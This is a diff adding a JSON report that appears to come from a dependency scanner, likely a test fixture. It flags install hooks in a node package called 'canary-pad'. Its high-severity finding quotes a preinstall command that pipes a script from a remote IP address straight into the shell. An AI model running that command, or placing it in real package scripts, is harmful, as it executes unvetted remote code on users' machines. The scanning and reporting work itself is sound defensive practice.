@@ -1,0 +1,35 @@
+{
+ "schema_version": 3,
+ "root": "/work",
+ "ecosystems": [
+  "node"
+ ],
+ "dependencies": [
+  {
+   "name": "canary-pad",
+   "version": "1.0.0",
+   "ecosystem": "node",
+   "direct": true,
+   "scope": "prod",
+   "parents": []
+  }
+ ],
+ "findings": [
+  {
+   "dependency": "canary-pad@1.0.0",
+   "severity": "high",
+   "category": "install_hook",
+   "detail": "npm `preinstall` script defined \u2014 references network/exec primitives",
+   "location": "/work/canary-pad/package.json",
+   "evidence": "curl -s http://198.51.100.7/x.sh | sh"
+  },
+  {
+   "dependency": "canary-pad@1.0.0",
+   "severity": "medium",
+   "category": "install_hook",
+   "detail": "npm `postinstall` script defined",
+   "location": "/work/canary-pad/package.json",
+   "evidence": "node setup.js"
+  }
+ ]
+}
